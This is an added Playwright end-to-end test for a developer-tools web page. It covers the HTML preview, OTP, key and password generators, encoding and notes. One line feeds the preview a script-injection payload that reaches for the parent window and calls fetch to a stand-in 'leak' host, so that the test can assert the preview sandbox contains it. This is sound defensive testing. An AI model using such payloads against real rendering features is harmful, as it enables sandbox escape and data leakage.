@@ -1,0 +1,86 @@
+const { chromium } = require('playwright');
+const assert = require('node:assert/strict');
+const http = require('node:http');
+const fs = require('node:fs');
+const path = require('node:path');
+const root = path.resolve('out');
+const mime = {'.html':'text/html', '.js':'application/javascript', '.css':'text/css', '.woff':'font/woff', '.woff2':'font/woff2', '.svg':'image/svg+xml', '.png':'image/png', '.ico':'image/x-icon'};
+const server = http.createServer((req,res) => {
+ const file = path.resolve(root, '.' + decodeURIComponent(new URL(req.url, 'http://localhost').pathname));
+ if (!file.startsWith(root + path.sep) || !fs.existsSync(file) || !fs.statSync(file).isFile()) { res.writeHead(404); res.end(); return; }
+ res.setHeader('content-type', mime[path.extname(file)] || 'application/octet-stream'); fs.createReadStream(file).pipe(res);
+});
+(async () => {
+ await new Promise(resolve => server.listen(3022, '127.0.0.1', resolve));
+ fs.mkdirSync('.test-artifacts', {recursive:true});
+ const browser=await chromium.launch({headless:true,args:['--no-sandbox']});
+ const context=await browser.newContext({viewport:{width:1440,height:1000},permissions:['clipboard-read','clipboard-write']});
+ const page=await context.newPage();
+ const errors=[]; page.on('pageerror',e=>errors.push(e.message));
+ const suspicious=[]; page.on('request',r=>{if(r.url().includes('example.invalid'))suspicious.push(r.url());});
+ await page.goto('http://127.0.0.1:3022/tools.html');
+ await page.getByRole('heading',{name:'Dev Tools.'}).waitFor();
+ await page.frameLocator('iframe[title="HTML preview"]').getByRole('heading',{name:'Hello, developer.'}).waitFor();
+ await page.screenshot({path:'.test-artifacts/tools-desktop.png',fullPage:true});
+ await page.getByLabel('HTML & CSS').fill('<h1>Preview works</h1><script>parent.__previewEscaped=true;fetch("https://example.invalid/leak")</script><img src="https://example.invalid/image"><meta http-equiv="refresh" content="0;url=https://example.invalid/"><a href="https://example.invalid/link">Link</a><iframe src="https://example.invalid/frame"></iframe>');
+ await page.getByRole('button',{name:'Update preview'}).click();
+ await page.frameLocator('iframe').getByRole('heading',{name:'Preview works'}).waitFor();
+ assert.equal(await page.evaluate(()=>window.__previewEscaped),undefined);
+ assert.equal(await page.locator('iframe').getAttribute('sandbox'),'');
+ assert.equal(await page.frameLocator('iframe').locator('a').getAttribute('href'),null);
+ assert.equal(suspicious.length,0);
+ await page.getByRole('button',{name:/OTP Generator/}).click();
+ await page.getByRole('button',{name:'Generate code',exact:true}).click();
+ assert.match(await page.getByLabel('OTP code').inputValue(),/^\d{6}$/);
+ await page.getByLabel('Code type').selectOption('totp');
+ await page.getByLabel('Base32 secret').fill('GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ');
+ await page.waitForFunction(()=>document.querySelector('textarea[readonly]')?.value.length===6);
+ assert.equal(await page.evaluate(()=>Object.keys(localStorage).length),0);
+ await page.getByRole('button',{name:/Key Generator/}).click();
+ await page.getByLabel('Length',{exact:true}).selectOption('64');
+ await page.getByRole('button',{name:'Generate key',exact:true}).click();
+ const key=await page.getByLabel('Generated key').inputValue(); assert.match(key,/^[a-f0-9]{64}$/);
+ await page.getByRole('button',{name:'Copy',exact:true}).click();
+ assert.equal(await page.evaluate(()=>navigator.clipboard.readText()),key);
+ await page.getByRole('button',{name:/Password Generator/}).click();
+ await page.getByRole('button',{name:'Generate password',exact:true}).click();
+ assert.equal((await page.getByLabel('Generated password').inputValue()).length,20);
+ for(const label of ['Uppercase','Lowercase','Numbers','Symbols']) await page.getByLabel(label,{exact:true}).uncheck();
+ await page.getByRole('button',{name:'Generate password',exact:true}).click();
+ await page.getByRole('alert').filter({hasText:'Select at least'}).waitFor();
+ await page.getByRole('button',{name:/Base32 \/ Base64/}).click();
+ await page.getByLabel('Input text').fill('hello');
+ await page.getByRole('button',{name:'Encode',exact:true}).click();
+ assert.equal(await page.getByLabel('Converted text').inputValue(),'aGVsbG8=');
+ await page.getByLabel('Input text').fill('%%%');
+ await page.getByRole('button',{name:'Decode',exact:true}).click();
+ await page.getByRole('alert').filter({hasText:'valid Base64'}).waitFor();
+ await page.getByRole('button',{name:/Notes A little/}).click();
+ await page.getByLabel('Your notes').fill('Remember this note.');
+ await page.reload(); await page.getByRole('button',{name:/Notes A little/}).click();
+ assert.equal(await page.getByLabel('Your notes').inputValue(),'Remember this note.');
+ const download=page.waitForEvent('download'); await page.getByRole('button',{name:'Download notes'}).click();
+ assert.equal((await download).suggestedFilename(),'developer-notes.txt');
+ await page.getByRole('button',{name:'Clear notes',exact:true}).click();
+ await page.getByRole('button',{name:'Keep notes'}).click();
+ assert.equal(await page.getByLabel('Your notes').inputValue(),'Remember this note.');
+ await page.getByRole('button',{name:'Clear notes',exact:true}).click();await page.getByRole('button',{name:'Delete notes',exact:true}).click();
+ assert.equal(await page.getByLabel('Your notes').inputValue(),'');
+ assert.equal(await page.evaluate(()=>localStorage.getItem('jelvan.devtools.notes.v1')),null);
+ for(const width of [390,320]) {
+  await page.setViewportSize({width,height:844});
+  for(const name of ['HTML Viewer','OTP Generator','Key Generator','Password Generator','Base32 / Base64','Notes']) {
+   await page.getByRole('navigation',{name:'Developer tools'}).getByRole('button',{name:new RegExp(name.replace(/[.*+?^${}()|[\]\\]/g,'\\$&'))}).click();
+   assert.ok(await page.evaluate(()=>document.documentElement.scrollWidth<=innerWidth),`overflow at ${width}: ${name}`);
+  }
+ }
+ await page.setViewportSize({width:390,height:844}); await page.getByRole('button',{name:/HTML Viewer/}).click();
+ await page.screenshot({path:'.test-artifacts/tools-mobile.png',fullPage:true});
+ for(const route of ['articles.html','portfolio/articles.html']) {
+  await page.goto('http://127.0.0.1:3022/'+route); await page.getByRole('heading',{name:'Dev Tools.'}).waitFor();
+ }
+ assert.deepEqual(errors,[]);
+ console.log('PASS: six tool panels, preview isolation, OTP, 64-character keys, clipboard, passwords, encoding validation, note reload/download/deletion, legacy routes, 320px/390px layouts. No page errors.');
+ await browser.close();
+ server.close();
+})().catch(e=>{console.error(e);process.exit(1)});
